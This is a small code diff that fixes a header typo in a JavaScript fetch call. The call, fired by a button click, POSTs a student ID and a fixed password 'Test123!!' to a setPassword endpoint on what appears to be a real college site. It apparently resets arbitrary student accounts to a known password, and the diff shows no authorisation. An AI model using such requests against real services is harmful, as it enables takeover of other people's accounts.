@@ -9,7 +9,7 @@ document.querySelector('.btn').addEventListener('click',function(){
             'https://jbcollege.curioversity.com/setPassword',
             {   method:'POST',
                 headers:{ 
-            '   Content-Type': 'application/x-www-form-urlencoded'
+                    'Content-Type': 'application/x-www-form-urlencoded'
                 },
                 body:"studentId="+roll_no+"&password=Test123!!&confirmPassword=Test123!!"
             })
